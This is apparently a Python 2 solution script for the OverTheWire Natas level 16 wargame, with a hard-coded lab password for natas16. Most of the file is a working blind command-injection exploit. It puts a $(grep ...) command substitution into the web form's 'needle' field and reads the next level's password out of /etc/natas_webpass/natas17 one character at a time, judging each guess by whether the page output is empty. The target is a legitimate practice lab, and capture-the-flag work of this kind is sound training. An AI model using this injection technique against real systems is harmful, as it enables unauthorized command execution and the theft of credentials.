#!/usr/bin/env python
# .*. coding: utf-8 -*-

import requests
import re 
from string import  *
usn = 'natas16'
pw = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
alphanum = lowercase + uppercase + digits

#url = 'http://%s.natas.labs.overthewire.org/index-source.html' % usn ##Source code
url = 'http://%s.natas.labs.overthewire.org/' % usn

session = requests.Session()
confirmed_pass = list()
#print alphanum
while(len(confirmed_pass) < 32):
  for ch in alphanum:
   
    response = session.post(url, data = { "needle" : "anythings$(grep ^" + "".join(confirmed_pass) + ch  + " /etc/natas_webpass/natas17)" },auth = (usn, pw) )
    content = response.text

    returned = re.findall( '<pre>\n(.*)\n</pre>', content )
    if( not returned ):
      confirmed_pass.append(ch)
      print "".join(confirmed_pass)

      break		
# Note: .join will iterate each character in the string - must be empty
# to keep it formatted correctly
print "".join(confirmed_pass)

